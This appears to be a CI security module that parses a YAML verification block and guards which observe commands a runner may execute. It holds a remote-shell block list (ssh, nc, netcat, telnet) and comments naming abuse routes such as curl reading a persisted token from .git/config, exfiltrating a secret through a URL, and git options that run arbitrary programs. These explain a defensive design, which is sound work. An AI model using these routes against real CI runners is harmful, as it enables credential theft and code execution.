#!/usr/bin/env python3
"""bites_parse.py — turn the `Bites:` contract from prose into something a machine can run.

THE FINDING (measured 2026-09-04 over the 177 PRs merged since 2026-09-01).
Every verification contract in this repository is prose honoured by an LLM. The
builder contract says each PR body carries a `Bites:` line naming the CONSUMER
and the observation that proves the change is in force — 110 of 177 bodies (62%)
carry one. Not one of them is read by anything: `grep -rlE Bites .github/workflows
scripts/*.py scripts/ci/*.py infra/claude-hooks` returned zero files. The machine
verifies the DIFF; the runtime is verified by a sentence someone wrote about it.

This module is the first half of the cure: a `bites` block a machine can PARSE and
a runner can later EXECUTE. It executes nothing itself — it is a parser and a set
of guards, deliberately separable from the executor that will consume it, so the
security model can be reviewed and tested without a runner anywhere near it.

WHERE THE CONTRACT LIVES, and why it moved (RULED 2026-09-04, Zero, Legge 5).
The first draft read the block out of the PR BODY, which meant deciding which
Markdown region a human actually SAW: a `<!-- -->` comment, a fenced block, a
four-space indent, a raw `<pre>` all render as page furniture rather than as a
contract, and a block hidden in one of them must not become an executable
observation. Three adversarial rounds closed five spellings of that one defect and
found a sixth; CodeQL named the pattern independently (`py/bad-tag-filter`). The
class does not close by patching — a hand-rolled CommonMark reader can only ever
approximate the renderer it is guessing at. So the contract MOVED into the diff:

    evidence/<YYYY-MM>/<slug>/pack.yml     # the dated dir from evidence_paths.py

        bites:
          consumer: <who reads or executes the changed thing>
          where: ci | fly | pro | mini
          observe: python3 scripts/ci/bites_parse.py --selftest
          expect: exit0

Same four keys, parsed by a REAL YAML parser. Hidden regions and line-splitting
cease to exist rather than being guarded: a pack has no rendered form, so there is
no gap between what a reviewer sees and what the machine reads. The PR body goes
back to prose for humans — at most a pointer to the pack path.

THREE PARSE OUTCOMES, and the difference between them is the whole migration story:

  absent     — the pack has no `bites:` key at all.        -> {"absent": true},  exit 0
               Every one of the 148 packs on main today.
  legacy     — a `bites:` block with no `observe:` key.     -> {"legacy": true},  exit 0
  executable — an `observe:` key is present.                -> the four fields,   exit 0
               Malformed (missing key, guard violation)     -> {"malformed":...}, exit 2

`absent` and `legacy` are NEVER an error. A lint built on this must judge the pack
under review and never history: no merged pack may turn red retroactively because a
format arrived after it.

THE SECURITY MODEL, which is the point rather than a footnote. `observe:` comes from
a file in a PULL REQUEST — text any account that can open a PR controls — and the
executor that will consume this parser runs on a GitHub runner holding a token. So
the guards below are an ALLOW-LIST, not a deny-list, and they run at PARSE time: a
command that does not pass them never becomes an executable block at all, which
means no downstream caller can forget to check.

  _guard_shell_composition  no way to chain, substitute, redirect or expand. `$`
                            is rejected too, not only command substitution — a
                            bare `$SECRET` in an argument cannot execute anything,
                            but sending it as part of a URL exfiltrates it just as
                            well. The ONE substitution the format offers is the
                            literal placeholder `{sha}`, which the executor
                            replaces with the merged commit sha.
  _guard_command_allowlist  first token must be one of gh, curl, git, python3,
                            fly, flyctl — and each carries its own narrowing:
                            python3 runs only `scripts/...` or `-m pytest`; fly,
                            flyctl and gh only their read-only subcommand PAIRS;
                            curl may not write a file or read a config file, and
                            must be https.
  _guard_no_remote_shell    ssh, scp, sftp, rsync, nc anywhere in the command, not
                            just in first position. The allow-list already bars
                            them from position one; this bars `git clone ssh://...`
                            and every other shape where the reach is an ARGUMENT.
                            Superscar #3's under-match twin: a guard that inspects
                            only the head of a command is a guard on a spelling.
  _guard_path_containment   no `..` segment and no absolute path argument: the
                            observation runs inside the checkout or not at all.
  _guard_expect_form        expect is exit0, contains:<text>, or regex:<pattern>,
                            and a regex must actually compile — an uncompilable
                            pattern is a comparison that can only ever throw.
  _guard_where_scope        where is one of ci, fly, pro, mini.
  _guard_no_invisible       no zero-width or soft-hyphen character in any of the
                            four values. YAML removes the question of which REGION
                            a reader saw; it does not remove the question of which
                            CHARACTERS a value holds: a `git status` carrying a
                            zero-width space renders exactly like one without.

WHAT THIS MODULE DELIBERATELY DOES NOT DO: decide whether a command may run. Trust
(author_association, fork-ness) is the EXECUTOR's question, not the parser's — a
Dependabot pack parses exactly like anyone else's and is simply never executed.
Keeping that split means these guards can be unit-tested with no network, no token
and no runner, which is why they are testable at all.

TWO CONSTRAINTS THE EXECUTOR INHERITS AND MUST HONOUR, because they are not decidable
from a command string. Neither is a note: PR-2 ships tests for both or it ships a hole.

(1) A SANITISED ENVIRONMENT. Half of git's dangerous behaviour is reached through CONFIG
rather than through argv, and no allow-list over a command line can see it: `diff` runs an
external diff or textconv filter, `status` starts `core.fsmonitor`, `cat-file` lazy-fetches
in a partial clone, a `%G` format runs `gpg.program`, and a pager starts on a TTY. The
executor therefore runs every observation with `GIT_CONFIG_GLOBAL=/dev/null`,
`GIT_CONFIG_SYSTEM=/dev/null`, `GIT_ATTR_NOSYSTEM=1`, `GIT_PAGER=cat`, `GIT_TERMINAL_PROMPT=0`,
`GIT_OPTIONAL_LOCKS=0`, and curl with `-q` prepended (curl reads `~/.curlrc` on every
invocation, and that file can carry `output=`). That is one rule against a whole class,
where argv-level rules would have been a list of the config keys somebody remembered.

(2) POST-MERGE ONLY.
A pull request can add a script and its `bites-observable` marker in the same diff, so
the marker is exactly as strong as the review of the diff that introduces it — no more.
Post-merge, the marked script is reviewed, merged code. Against an unmerged PR checkout
there is no boundary here at all, and the same holds for `python3 -m pytest`, which
imports whatever `conftest.py` the branch happens to carry.
"""

# bites-observable — this script is reachable from an `observe:` line. It qualifies
# under its own rule: its two arguments are a flag and a path it only READS, neither
# of which can name a program to run, a file to write, or a database to reach. See
# _guard_observable_script for why location grants nothing and only this marker does.

from __future__ import annotations

import argparse
import json
import re
import shlex
import sys
from pathlib import Path
from typing import Any

import yaml

EXIT_OK = 0
EXIT_MALFORMED = 2

#: This file lives at scripts/ci/, so the checkout root is two levels up.
REPO_ROOT = Path(__file__).resolve().parents[2]

#: The only substitution the format offers. The executor replaces it; the parser
#: only has to know it is not an attempt at shell expansion.
SHA_PLACEHOLDER = "{sha}"

#: The four keys, and the top-level key they live under in `pack.yml`.
BITES_KEY = "bites"
REQUIRED_KEYS = ("consumer", "where", "observe", "expect")

WHERE_SCOPES = ("ci", "fly", "pro", "mini")

#: First-token allow-list. Anything not here is rejected outright.
ALLOWED_COMMANDS = ("gh", "curl", "git", "python3", "fly", "flyctl")

#: What may follow an allow-listed subcommand word. The first draft spelled both of
#: these `None`, which read as "anything may follow" and was two different rules
#: wearing one name: `gh api <path>` is followed by DATA, while `fly version` is
#: followed by nothing — and `fly version upgrade` REPLACES THE BINARY. Naming the
#: two cases apart is what closes that hole, and it generalises: every allow-list
#: entry is now a full pair that declares which of the two it is.
NO_SUBCOMMAND = "\x00no-subcommand"    # nothing but flags may follow
ANY_POSITIONAL = "\x00any-positional"  # a data argument follows, never a verb

#: Read-only fly/flyctl subcommand PAIRS. The first draft listed FIRST WORDS only, and
#: `machine` was one of them — which Kimi K3, refuting this file on 2026-09-04, pointed
#: out admits `fly machine run <image>`: arbitrary container execution on production
#: infrastructure, through a guard whose whole purpose was to keep observations read-only.
#: `fly machine destroy` and `fly machine update` came through the same gap. A one-word
#: check on a command with two-word subcommands is superscar #3's under-match, and it
#: recurred a third time on `("version", None)`: `fly version upgrade` downloads and
#: installs a new flyctl. NO_SUBCOMMAND is the fix for that whole shape.
FLY_READONLY_SUBCOMMANDS = (
    ("status", NO_SUBCOMMAND), ("releases", NO_SUBCOMMAND),
    ("version", NO_SUBCOMMAND), ("logs", NO_SUBCOMMAND),
    ("image", "show"), ("machine", "list"), ("machine", "status"),
)

#: curl options an observation may use. INVERTED to an allow-list on 2026-09-04, after
#: the FOURTH hole in the deny-list it replaces. The deny-list had already lost `-b`
#: (reads .git/config, where actions/checkout persists the token), `-w@<path>` (prints a
#: local file to stdout), `--netrc-file` and `--variable`; a fifth review found three more
#: in one pass — `--json=@<path>` (documented as a shortcut for `--data`, and it takes the
#: same `@filename` file-read syntax), `--libcurl=<path>` (writes a generated C file) and
#: `--etag-save=<path>` (writes a file whose content the remote controls). curl 8.7 has
#: over two hundred options and a deny-list over them can only ever be a list of the ones
#: someone thought of. Rule 8: a surface that fails four times in the same way is
#: under-specified, so this is the SPEC — everything not named here is refused, and adding
#: an option means adding it here with a guilt and an innocence proof.
#:
#: Value-taking options must be written `--flag=value`, which the "exactly one non-flag
#: argument" rule below already forces. A value beginning with `@` is refused wherever it
#: appears: `-H @file` and `--json @file` both make curl read a local file into the request.
CURL_ALLOWED_FLAGS = (
    "-s", "--silent", "-S", "--show-error", "-f", "--fail", "--fail-with-body",
    "-L", "--location", "-i", "--include", "-I", "--head", "--compressed",
    "-m", "--max-time", "--connect-timeout", "--max-redirs",
    "--retry", "--retry-delay", "--retry-max-time", "-w", "--write-out",
    "-H", "--header", "-A", "--user-agent", "--http1.1", "--http2", "--ipv4", "--ipv6",
)

#: Short options that carry no value, so they may be bundled (`-sS`, `-sSL`).
CURL_ALLOWED_SHORT_BUNDLE = "sSfLiI"

#: Options whose value is the NEXT token unless glued. They are consumed in pairs rather
#: than counted as the URL, which is what lets this repo's own idioms through:
#: `curl -fsS -m 5 <url>` appears in five scripts and `-w "%{http_code}"` is the standard
#: health check. `-w@<path>` stays refused — by _guard_args_from_file, which judges the
#: VALUE, so re-admitting the option does not reopen the hole it was removed for.
CURL_VALUE_TAKING_FLAGS = (
    "-H", "--header", "-A", "--user-agent", "-m", "--max-time", "--connect-timeout",
    "--max-redirs", "--retry", "--retry-delay", "--retry-max-time", "-w", "--write-out",
)

#: pytest options an observation may use. An allow-list for the third time in this file,
#: and for the same reason: the deny-list it replaces named the options that choose code to
#: IMPORT (`-p`, `-o`, `--override-ini`, `--rootdir`, `--import-mode`, `--pdb`, `--assert`)
#: and never considered the ones that WRITE. `--junitxml=<relative path>` writes an XML
#: report anywhere in the checkout, including over a source file, and the path guard permits
#: a relative path by design.
PYTEST_ALLOWED_FLAGS = (
    "-q", "--quiet", "-v", "--verbose", "-x", "--exitfirst", "--tb", "-k", "-m",
    "--maxfail", "--no-header", "--no-summary", "-r", "--durations", "--color",
    "--strict-markers", "--strict-config", "--capture", "-s",
)
#: Options whose value is a separate word unless it is glued with `=`. They must be
#: written `--flag=value`, because a separate value is indistinguishable from a test path
#: to any reader of argv — `pytest -k tests` looks like the target `tests`.
PYTEST_VALUE_TAKING_FLAGS = (
    "-k", "-m", "-r", "--maxfail", "--durations", "--tb", "--capture", "--color",
)

#: `-W` was here until 2026-09-04 and is deliberately gone: pytest resolves a warning
#: filter's category with `__import__`, so `-W error::evil.Custom` imports a module the
#: argument names. An allow-list of OPTIONS still has to ask what each option's VALUE can
#: reach — which is the same lesson as `curl -b`, one level in.

#: `gh` options an observation may use. The fourth list inverted, and the last two were
#: inverted for findings a deny-list could not have held: `--cache=1h` persists the
#: response to a local cache (a write), and `--web` opens a browser. The deny-list it
#: replaces named only the retargeting flags (`-R`, `--repo`, `--hostname`).
GH_ALLOWED_FLAGS = (
    "--json", "--jq", "-q", "--template", "-t", "--limit", "-L", "--state", "-s",
    "--paginate", "--header", "-H", "--slurp",
)

#: `git` GLOBAL options — the ones before the subcommand — are an allow-list with NOTHING
#: in it. `-c` is code execution, `--paginate` starts $PAGER, `--help` becomes `git help`
#: which starts man or a browser, `-C`/`--git-dir`/`--work-tree` retarget the tree. An
#: observation has never needed one, so the honest allow-list is empty rather than a list
#: of the dangerous ones somebody remembered.
GIT_GLOBAL_ALLOWED_FLAGS: tuple[str, ...] = ()

#: `fly`/`flyctl` options. `-c`/`--config` READS a file the argument names, which is how
#: `fly status --config=.git/config` reached a credential file through a subcommand table
#: that was otherwise correct — the pairs were checked and the flags were not.
FLY_ALLOWED_FLAGS = ("-a", "--app", "--json", "-j", "--now", "--all")

#: A script is reachable by `observe:` only if its own SOURCE carries this marker.
#: Codex, red-teaming this file on 2026-09-04, made the point that killed the first
#: draft's rule: allow-listing `python3 scripts/...` allow-lists roughly nine hundred
#: scripts, and it named the worst ones by path. `scripts/usage/cswap.py run <cmd>`
#: reaches `os.execvpe`; `scripts/ci/restore_drill_verify.py --psql-bin` and
#: `scripts/ci/stage_council_journal.py --git-bin` each execute a binary the argument
#: names; a dozen more take a `--dsn`, a `--database-url` or an `--output-db`. A path
#: prefix is not a capability boundary. The marker is: a script is observable because
#: someone wrote in it that it is, which is content-keyed rather than location-keyed
#: (W109: an exemption keyed to where a file sits rather than what it is, is itself a
#: scar). Absent marker, absent file, unreadable file -> refused.
OBSERVABLE_MARKER = "bites-observable"

#: `gh` subcommand PAIRS that only read. `gh pr merge`, `gh workflow run`, `gh api -X POST`
#: and `gh repo clone` all act; an allow-list keyed on `gh` alone would permit every one.
GH_READONLY_SUBCOMMANDS = (
    ("pr", "view"), ("pr", "list"), ("pr", "diff"), ("pr", "checks"),
    ("run", "view"), ("run", "list"), ("release", "view"), ("workflow", "view"),
    ("issue", "view"), ("issue", "list"), ("search", "prs"), ("api", ANY_POSITIONAL),
)

#: `gh api` flags that turn a read into a write or read a body from a file.
GH_API_FORBIDDEN_FLAGS = ("-X", "--method", "-f", "-F", "--field", "--raw-field", "--input")

#: `git` subcommands that only read the local object store. `clone`, `fetch`, `push`,
#: `remote` and `submodule` all reach the network; the rest here do not.
#: `tag` and `branch` were here in the first draft and are gone: with an argument they
#: CREATE a ref, which is a write to the object store, and `-d` deletes one. "Read-only"
#: has to mean the subcommand cannot write in any invocation, not that its common form
#: happens not to. These stay single words rather than pairs because each is a terminal
#: verb: git's namespaced subcommands (`stash list`, `notes add`, `remote add`) are all
#: absent from this list, so there is no second word here that could name an action.
GIT_READONLY_SUBCOMMANDS = (
    "log", "show", "status", "diff", "rev-parse", "ls-tree", "cat-file", "grep",
    "describe", "ls-files", "shortlog", "blame", "rev-list",
)


#: Subcommand options an observation may use, checked AFTER the subcommand word. Inverted
#: to an allow-list for the same reason as curl's, and after the same shape of failure
#: three times over: `git diff --output=<relative>` writes a file the path guard permits;
#: `git grep -O<cmd>` opens matches in a PAGER COMMAND the argument names; and
#: `git diff --no-index <a> <b>` leaves the repository entirely and diffs two arbitrary
#: files, which turns a repo-scoped read into a filesystem read. Each was found by a
#: different reviewer, none by the list itself.
#:
#: A bare `-<digits>` (`git log -1`) is accepted as a count. Everything else not named
#: here is refused, and adding an option means adding it here with both proofs.
GIT_SUB_ALLOWED_FLAGS = (
    "-n", "--max-count", "--skip", "--oneline", "--format", "--pretty", "--date",
    "--name-only", "--name-status", "--stat", "--numstat", "--shortstat",
    "--abbrev-commit", "--no-abbrev-commit", "--no-color", "--color", "--no-patch",
    "--no-merges", "--merges", "--first-parent", "--follow", "--reverse", "--graph",
    "--since", "--until", "--author", "--committer", "--grep", "--all", "--decorate",
    "--cached", "--staged", "--porcelain", "--short", "--branch", "--exit-code",
    "--quiet", "-q", "-c", "-l", "-L", "-i", "-E", "-w", "-h", "-r", "-t", "-p", "-s",
    "--count", "--files-with-matches", "--files-without-match", "--line-number",
    "--word-diff", "--full-tree", "--name-rev", "--verify", "--abbrev-ref",
    "--show-toplevel", "--is-inside-work-tree", "--symbolic-full-name", "--tags",
    "--contains", "--long", "--dirty", "--check", "--summary", "--find-renames",
    # Added 2026-09-04 after a review measured the OVER-match the inversion introduced:
    # each of these is display-shape only, and each is already in daily use in this repo
    # (`--diff-filter=` in 8 files, `--no-renames` in 11, `--` in the standard
    # `git diff --name-only HEAD -- <path>` idiom). Inverting a list is only safe if the
    # real shapes survive it, and three of them did not.
    "--diff-filter", "--no-renames", "--no-ext-diff", "--no-textconv", "-z", "--",
)

#: `-U<n>` (diff context) and `-<n>` (commit count) are numeric options nothing can
#: enumerate, and neither can name a file or a program.
GIT_NUMERIC_FLAG_PREFIXES = ("-U",)

#: Invisible characters. A value containing one reads identically to a value without
#: it, so the human reviewer and the parser can be shown two different contracts.
_INVISIBLE_CHARS = ("\u200b", "\u200c", "\u200d", "\u2060", "\ufeff", "\u00ad")

#: Tokens that reach another machine. Barred ANYWHERE, not just in first position.
REMOTE_SHELL_TOKENS = ("ssh", "scp", "sftp", "rsync", "nc", "netcat", "telnet")

#: Characters that would let one command become two, or become a different one.
_SHELL_METACHARS = ("|", ";", "&", "$", "`", "(", ")", "<", ">", "\n", "\r", "\\")

# --------------------------------------------------------------------- guards


def _flag_is(token: str, forbidden: str) -> bool:
    """Does `token` invoke the option `forbidden`, in any of its three spellings?

    `--flag`, `--flag=value`, and — for a SHORT option — `-Ovalue` with the value glued
    on. The last one is why this helper exists: the first draft compared
    `token.split("=", 1)[0]`, so `git grep -Oevil` never matched the entry `-O`. The
    verdict gate of 2026-09-04 found it on a real option that runs a pager command.
    """
    if forbidden.endswith("-"):          # a family, e.g. "--expand-" for every --expand-*
        return token.startswith(forbidden)
    if token == forbidden or token.startswith(forbidden + "="):
        return True
    return len(forbidden) == 2 and forbidden[1] != "-" and token.startswith(forbidden)


def _any_flag_is(token: str, forbidden: tuple[str, ...]) -> str | None:
    return next((f for f in forbidden if _flag_is(token, f)), None)


def _guard_args_from_file(command: str) -> list[str]:
    """No argument may begin with `@`.

    Three separate tools read a FILE when an argument starts with `@`: pytest expands
    `@args.txt` into more arguments (including options this allow-list refuses), curl's
    `-d`/`--json`/`-H` read the named file into the request, and `curl -w@<path>` prints
    it. Each was found separately, in three different reviews; the shape is one rule.
    """
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    for arg in argv[1:]:
        if "://" in arg:
            continue  # a URL's query string may carry `=@`; it is not a flag value
        opens_a_file = (
            arg.startswith("@")                       # `@args.txt`
            or "=@" in arg                            # `--json=@path`
            or (len(arg) > 2 and arg[0] == "-" and arg[1] != "-" and arg[2] == "@")
        )                                             # `-w@path`, the glued short form
        if opens_a_file:
            return [
                f"observe: `{arg}` begins its value with `@`, which makes pytest, curl and "
                f"gh read the named FILE — an observation reads its own output, not the disk"
            ]
    return []


def _guard_shell_composition(command: str) -> list[str]:
    """Reject anything that could chain, substitute, redirect or expand.

    The placeholder `{sha}` is excised before the scan so the format's one
    sanctioned substitution is not mistaken for shell expansion — it contains no
    metacharacter anyway, but excising it keeps the intent legible.
    """
    scanned = command.replace(SHA_PLACEHOLDER, "")
    found = sorted({c for c in _SHELL_METACHARS if c in scanned})
    if not found:
        return []
    shown = ", ".join(repr(c) for c in found)
    return [
        f"observe: contains shell metacharacter(s) {shown} — the observation must be "
        f"ONE command with no chaining, substitution, redirection or variable "
        f"expansion (the only substitution offered is the literal {SHA_PLACEHOLDER})"
    ]


def _is_count_flag(token: str) -> bool:
    """`git log -1`, `git diff -U0` — numeric options no allow-list can enumerate."""
    if len(token) > 1 and token[0] == "-" and token[1:].isdigit():
        return True
    return any(
        token.startswith(prefix) and token[len(prefix):].isdigit() and token[len(prefix):]
        for prefix in GIT_NUMERIC_FLAG_PREFIXES
    )


def _leading_words(rest: list[str]) -> list[str]:
    """The subcommand path: the bare words BEFORE the first flag.

    `fly status -a nuzantara-rag` has ONE subcommand word, not two. The first
    draft filtered out every token starting with `-` and then read words[0:2],
    which counts a flag's separate VALUE as a second subcommand word — so the
    pair it judged was ("status", "nuzantara-rag"). Reading only the leading run
    means the subcommand must be written before any flag, which is how everyone
    writes it and is fail-closed for the spellings that are not.
    """
    out: list[str] = []
    for token in rest:
        if token.startswith("-"):
            break
        out.append(token)
    return out


def _subcommand_permitted(words: list[str], table: tuple[tuple[str, str], ...]) -> bool:
    """Match a leading-word run against a table of full pairs.

    NO_SUBCOMMAND means nothing but flags may follow (`fly version` yes,
    `fly version upgrade` no — that one REPLACES THE BINARY). ANY_POSITIONAL
    means the next word is data rather than a verb (`gh api <endpoint>`).
    Spelling both as `None` is what let `fly version upgrade` through.
    """
    first = words[0] if words else ""
    second = words[1] if len(words) > 1 else None
    for want_first, want_second in table:
        if first != want_first:
            continue
        if want_second is ANY_POSITIONAL:
            return True
        if want_second is NO_SUBCOMMAND:
            if second is None:
                return True
            continue
        if second == want_second:
            return True
    return False


def _render_table(table: tuple[tuple[str, str], ...], prefix: str) -> str:
    return ", ".join(
        f"{prefix}{first}"
        if second is NO_SUBCOMMAND or second is ANY_POSITIONAL
        else f"{prefix}{first} {second}"
        for first, second in table
    )


def _guard_command_allowlist(command: str) -> list[str]:
    """First token must be allow-listed, and each allowed command is narrowed."""
    try:
        argv = shlex.split(command)
    except ValueError as exc:
        return [f"observe: not parseable as a command ({exc})"]
    if not argv:
        return ["observe: empty command"]
    head = argv[0]
    if head not in ALLOWED_COMMANDS:
        return [
            f"observe: `{head}` is not allow-listed — permitted first tokens are "
            f"{', '.join(ALLOWED_COMMANDS)}"
        ]

    rest = argv[1:]
    if head == "python3":
        if rest[:1] == ["-m"]:
            if rest[1:2] != ["pytest"]:
                return ["observe: `python3 -m` is permitted only for `pytest`"]
            for flag in rest[2:]:
                if flag.split("=", 1)[0] in PYTEST_VALUE_TAKING_FLAGS and "=" not in flag:
                    return [
                        f"observe: write `pytest {flag}=<value>`. With a separate value "
                        f"there is no way to tell an option's value from a test path — "
                        f"`pytest -k tests` reads as the target `tests`, which exists, and "
                        f"pytest then discovers every test from the working directory."
                    ]
            targets = [a for a in rest[2:] if not a.startswith("-")]
            if not targets:
                return [
                    "observe: `pytest` with no target discovers every test from the "
                    "working directory. Name the test path the observation is about."
                ]
            for flag in rest[2:]:
                if not flag.startswith("-"):
                    continue
                base = flag.split("=", 1)[0]
                if base.startswith("-o") and base != "-o":
                    base = "-o"
                if base in PYTEST_ALLOWED_FLAGS:
                    continue
                return [
                    f"observe: `pytest {base}` is not an allow-listed option. The deny-list "
                    f"this replaced banned `-p`/`-o`/`--override-ini` (which choose code to "
                    f"import) and still admitted `--junitxml=<path>` and `--basetemp=<path>`, "
                    f"which WRITE — including over a repo file the path guard permits."
                ]
        elif not (rest and rest[0].startswith("scripts/")):
            return [
                "observe: `python3` must run `scripts/...` from the checkout, or "
                "`python3 -m pytest`"
            ]
    elif head in ("fly", "flyctl"):
        words = _leading_words(rest)
        if not _subcommand_permitted(words, FLY_READONLY_SUBCOMMANDS):
            shown = " ".join(words[:2]) or "<none>"
            return [
                f"observe: `{head} {shown}` is not a read-only subcommand — permitted: "
                + _render_table(FLY_READONLY_SUBCOMMANDS, "")
            ]
        for flag in rest:
            if not flag.startswith("-"):
                continue
            base = flag.split("=", 1)[0]
            if base not in FLY_ALLOWED_FLAGS:
                return [
                    f"observe: `{head} {base}` is not an allow-listed option — "
                    f"`-c`/`--config` READS the file its argument names, which reaches a "
                    f"credential file through a subcommand table that is otherwise correct"
                ]
    elif head == "gh":
        words = _leading_words(rest)
        if not _subcommand_permitted(words, GH_READONLY_SUBCOMMANDS):
            shown = " ".join(words[:2]) or "<none>"
            return [
                f"observe: `gh {shown}` is not a read-only subcommand — permitted: "
                + _render_table(GH_READONLY_SUBCOMMANDS, "gh ")
            ]
        for flag in rest:
            if not flag.startswith("-"):
                continue
            base = flag.split("=", 1)[0]
            if base not in GH_ALLOWED_FLAGS:
                return [
                    f"observe: `gh {base}` is not an allow-listed option — `--cache` "
                    f"writes a response cache, `--web` opens a browser, and `-R`/"
                    f"`--hostname` point the command at somebody else's repository"
                ]
        if words[:1] == ["api"]:
            for flag in rest:
                base = _any_flag_is(flag, GH_API_FORBIDDEN_FLAGS)
                if base:
                    return [
                        f"observe: `gh api {base}` sends a request body or a method other "
                        f"than GET — an observation reads"
                    ]
    elif head == "git":
        sub_at = next((i for i, a in enumerate(rest) if not a.startswith("-")), len(rest))
        for flag in rest[:sub_at]:
            base = flag.split("=", 1)[0]
            if base not in GIT_GLOBAL_ALLOWED_FLAGS:
                return [
                    f"observe: `git {base}` is a GLOBAL git option, and none are permitted. "
                    f"`-c` runs a program the argument names, `--paginate` starts $PAGER, "
                    f"`--help` becomes `git help` which starts man or a browser, and "
                    f"`-C`/`--git-dir`/`--work-tree` point git at another tree. Put the "
                    f"subcommand first."
                ]
        for flag in rest[sub_at + 1:]:
            if not flag.startswith("-"):
                continue
            base = flag.split("=", 1)[0]
            if base in ("--format", "--pretty") and "%G" in flag:
                return [
                    "observe: a `%G` pretty-format placeholder asks git to VERIFY a "
                    "signature, which runs `gpg.program` — a program a config value names"
                ]
            if _is_count_flag(base) or base in GIT_SUB_ALLOWED_FLAGS:
                continue
            return [
                f"observe: `git {base}` is not an allow-listed option — git options are an "
                f"allow-list because the deny-list they replaced lost `--output`, `-O` and "
                f"`--no-index` one at a time. Add it to GIT_SUB_ALLOWED_FLAGS with a guilt "
                f"and an innocence proof if the observation genuinely needs it."
            ]
        sub = rest[sub_at] if sub_at < len(rest) else ""
        if sub not in GIT_READONLY_SUBCOMMANDS:
            return [
                f"observe: `git {sub or '<none>'}` is not a local read-only subcommand — "
                f"permitted: {', '.join(GIT_READONLY_SUBCOMMANDS)}"
            ]
    elif head == "curl":
        for flag in rest:
            if not flag.startswith("-"):
                continue
            base, _, value = flag.partition("=")
            if value.startswith("@") or (base not in CURL_ALLOWED_FLAGS and "@" in flag):
                return [
                    "observe: a curl option whose value begins with `@` makes curl READ A "
                    "LOCAL FILE into the request — an observation reads the network, not "
                    "the disk"
                ]
            if base in CURL_ALLOWED_FLAGS:
                continue
            if not base.startswith("--") and len(base) > 1 and all(
                c in CURL_ALLOWED_SHORT_BUNDLE for c in base[1:]
            ):
                continue  # a bundle of valueless short options, e.g. -sS
            return [
                f"observe: `curl {base}` is not an allow-listed option — curl options are "
                f"an allow-list because the deny-list they replaced lost `-b`, `-w@`, "
                f"`--netrc-file`, `--variable`, `--json=@`, `--libcurl` and `--etag-save` "
                f"one at a time. Add it to CURL_ALLOWED_FLAGS with a guilt and an "
                f"innocence proof if the observation genuinely needs it."
            ]
        # The first draft only checked args that LOOKED like URLs, so `curl evil.test/x`
        # sailed through and curl defaulted it to plain http. The rule is now positive:
        # exactly one non-flag argument, and it must be https. A flag that takes a
        # separate value must therefore be written in its `--flag=value` form.
        # Consume a value-taking option's value so it is not counted as the URL. Doing
        # this by ARITY rather than by "does it start with -" is what admits
        # `curl -m 5 <url>` and `-w '%{http_code}' <url>` without admitting a second URL.
        words: list[str] = []
        skip_next = False
        for token in rest:
            if skip_next:
                skip_next = False
                continue
            if token in CURL_VALUE_TAKING_FLAGS:
                skip_next = True
                continue
            if not token.startswith("-"):
                words.append(token)
        if len(words) != 1:
            return [
                f"observe: `curl` must take exactly one non-flag argument (the https URL); "
                f"found {len(words)}. Write value-taking flags as `--flag=value`."
            ]
        if not words[0].startswith("https://"):
            return [f"observe: `curl` target `{words[0]}` is not an https:// URL"]
    return []


def _guard_observable_script(command: str, repo_root: Path | None = None) -> list[str]:
    """A `python3 scripts/...` target must declare itself observable, in its own source.

    This is the guard Codex's red-team pass forced into existence. `python3 scripts/...`
    reads like a narrow rule and is not one: it admits every script in the tree, and the
    tree contains `scripts/usage/cswap.py`, whose `run` subcommand reaches `os.execvpe`,
    plus scripts taking `--psql-bin`, `--git-bin`, `--dsn` and `--output-db`. Any of them
    turns a permitted first token into arbitrary execution or an arbitrary write.

    So reachability is a property a script declares about ITSELF, by carrying the marker
    `bites-observable` in its source. Fail-closed in every direction: no marker, no file,
    unreadable file, or a path that escapes the checkout -> refused. Location grants
    nothing (W109), which is why the check reads the file rather than the path.
    """
    root = repo_root if repo_root is not None else REPO_ROOT
    try:
        argv = shlex.split(command)
    except ValueError:
        return []  # the allow-list guard already reports an unparseable command
    if not argv or argv[0] != "python3":
        return []
    rest = argv[1:]
    if rest[:1] == ["-m"]:
        # pytest collects PATHS, and every path must live under a tests directory: a
        # module named anywhere else runs its import-time code just as happily.
        # A target must EXIST and must RESOLVE inside a tests directory in this checkout.
        # Checking the written path for the segment `tests` was two holes at once: `-k
        # tests` put the value of an option where a target was expected and satisfied the
        # segment check with a word, and `scripts/tests/link/x.py` satisfies it while
        # `link` is a symlink pointing anywhere at all. Resolution answers both.
        targets = [a for a in rest[2:] if not a.startswith("-")]
        for target in targets:
            resolved = (root / target).resolve()
            try:
                relative = resolved.relative_to(root.resolve())
            except ValueError:
                return [f"observe: `pytest` target `{target}` resolves outside the checkout"]
            if not resolved.exists():
                return [f"observe: `pytest` target `{target}` does not exist in the checkout"]
            if "tests" not in relative.parts:
                return [
                    f"observe: `pytest` target `{target}` does not resolve under a `tests/` "
                    f"directory — pytest runs a module's import-time code wherever it sits"
                ]
        return []
    if not rest:
        return []
    target = rest[0]
    path = (root / target).resolve()   # resolve() follows symlinks: a link out is an escape
    try:
        path.relative_to(root.resolve())
    except ValueError:
        return [f"observe: `{target}` resolves outside the checkout"]
    if not path.is_file():
        return [f"observe: `{target}` does not exist in the checkout"]
    try:
        source = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return [f"observe: `{target}` could not be read ({exc})"]
    if OBSERVABLE_MARKER not in source:
        return [
            f"observe: `{target}` does not declare itself observable — add a comment "
            f"containing `{OBSERVABLE_MARKER}` to it, and only do so for a script whose "
            f"arguments cannot name a program to run, a file to write, or a database to "
            f"reach"
        ]
    return []


def _guard_no_remote_shell(command: str) -> list[str]:
    """Bar every reach to another machine, in ANY position.

    The allow-list already keeps these out of first position. This guard exists
    because a guard that only inspects the head of a command is a guard on a
    spelling: `git clone ssh://...` never trips an allow-list keyed on `git`.
    """
    try:
        argv = shlex.split(command)
    except ValueError:
        argv = command.split()
    hits: set[str] = set()
    for token in argv:
        low = token.lower()
        if low in REMOTE_SHELL_TOKENS:
            hits.add(low)
        for scheme in REMOTE_SHELL_TOKENS:
            if low.startswith(f"{scheme}://"):
                hits.add(scheme)
    if not hits:
        return []
    return [
        f"observe: reaches another machine via {', '.join(sorted(hits))} — host-scope "
        f"observations use `where: pro` / `where: mini` and a host executor, never a "
        f"remote shell from a runner"
    ]


def _escapes_checkout(value: str) -> str:
    """Why this path leaves the checkout, or "" if it does not.

    Three ways out, not two. `/abs` and `..` were the first draft's whole rule; `~`
